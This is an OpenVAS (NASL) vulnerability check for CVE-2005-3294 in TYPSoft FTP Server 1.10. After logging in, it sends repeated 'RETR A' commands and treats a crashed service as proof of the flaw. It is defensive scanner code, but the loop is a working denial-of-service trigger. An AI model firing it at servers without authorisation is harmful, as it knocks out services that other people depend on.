###############################################################################
# OpenVAS Vulnerability Test
#
# TYPSoft FTP Server RETR CMD Denial Of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801687");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-01-08 10:30:18 +0100 (Sat, 08 Jan 2011)");
  script_cve_id("CVE-2005-3294");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("TYPSoft FTP Server RETR CMD Denial Of Service Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/17196");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/15104");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15860/");
  script_xref(name:"URL", value:"http://www.exploitlabs.com/files/advisories/EXPL-A-2005-016-typsoft-ftpd.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/typsoft/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause
  a denial of service.");

  script_tag(name:"affected", value:"TYPSoft FTP Server Version 1.10.");

  script_tag(name:"insight", value:"The flaw is due to an error in handling the RETR command,
  which can  be exploited to crash the FTP service by sending multiple RETR commands.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"TYPSoft FTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "TYPSoft FTP Server" >!< banner)
  exit(0);

soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(login_details)
{
  for(i=0; i<5; i++)
  {
    response = ftp_send_cmd(socket:soc, cmd:"RETR A");

    if(! response)
    {
      security_message(port:ftpPort);
      exit(0);
    }
  }
}
ftp_close(socket:soc);
